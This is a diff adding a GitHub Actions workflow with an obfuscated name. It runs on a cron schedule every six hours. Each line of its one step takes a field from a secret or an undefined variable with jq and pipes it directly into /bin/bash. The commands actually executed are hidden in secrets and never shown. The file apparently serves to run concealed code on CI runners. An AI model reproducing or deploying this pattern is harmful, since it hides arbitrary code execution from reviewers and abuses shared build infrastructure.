@@ -1,0 +1,29 @@
+name: xiawudedierjiek
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiawudedierjiek
+        env:
+          vs86: ${{ secrets.vs86 }}
+        run: |
+          echo $vs86 | jq -r .b52 | /bin/bash
+          echo $vl95 | jq -r .z875 | /bin/bash
+          echo $pgsev0003 | jq -r .s33925 | /bin/bash
+          echo $lpbkx358 | jq -r .scwia8486 | /bin/bash
+          echo $zftpo594 | jq -r .lfiu391 | /bin/bash
+          echo $jr91990 | jq -r .jkaax7 | /bin/bash
+          echo $sapf69 | jq -r .ix62 | /bin/bash
+          echo $rdck98 | jq -r .f04 | /bin/bash
+          echo $ysh565 | jq -r .p90 | /bin/bash
+          echo $bnscw7 | jq -r .lrpf22 | /bin/bash
+          echo $ro8 | jq -r .qtnrj419 | /bin/bash
+          echo $yf2 | jq -r .ewd30321 | /bin/bash
+
